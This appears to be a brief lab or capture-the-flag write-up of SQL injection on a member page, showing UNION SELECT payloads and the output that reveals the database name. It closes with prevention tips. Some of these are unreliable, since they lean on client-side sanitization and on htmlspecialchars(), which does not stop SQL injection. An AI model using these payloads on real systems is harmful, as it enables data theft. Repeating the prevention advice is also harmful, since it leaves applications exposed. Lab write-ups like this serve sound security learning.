# SQL Injection Member page
Page: http://10.13.200.53/?page=member

## SQL
Basic SQL injection test:

`1 == 1`

**Result**: `You have an error sin your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '= 1' at line 1`

`1 UNION SELECT 1,2`
**Result**: 
```
ID: 1 UNION SELECT 1,2 
First name: one
Surname : me
ID: 1 UNION SELECT 1,2 
First name: 1
Surname : 2
```

**Database name:**
```
ID: 0 UNION SELECT 1,database()
First name: 1
Surname : Member_Sql_Injection
```

## How to prevent SQL injection
### Client Side (JQUERY)
- Input sanitization, before sending any data to the server
- Use input masks to restrict user input to specific formats.



### Server side (PHP)
- Use ORM
- Input validation and sanitization with php functions like:
    - `filter_var()`
    - `htmlspecialchars()`

